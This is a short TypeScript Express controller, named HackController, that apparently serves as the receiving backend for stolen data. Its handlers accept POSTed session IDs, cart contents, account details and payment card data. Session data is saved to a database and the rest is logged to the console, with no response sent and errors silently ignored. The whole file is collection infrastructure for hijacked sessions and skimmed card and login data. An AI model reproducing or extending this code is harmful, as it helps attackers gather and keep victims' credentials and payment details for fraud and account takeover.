import { NextFunction, Request, Response } from "express";
import { SessionModel } from "../config/database/schema/session.schema";

export class HackController {
    public static postSessionId(
        req: Request,
        res: Response,
        next: NextFunction
    ) {
        const session = new SessionModel(req.body);
        session
            .save()
            .then(() => {
                console.log("Session luu thanh cong!");
            })
            .catch(() => {});
    }

    public static postCart(req: Request, res: Response) {
        console.log(req.body);
    }

    public static postCartSent(req: Request, res: Response) {
        console.log(req.body);
    }

    public static postAccount(req: Request, res: Response) {
        console.log(req.body);
    }

    public static postCard(req: Request, res: Response) {
        console.log(req.body)
    }
}
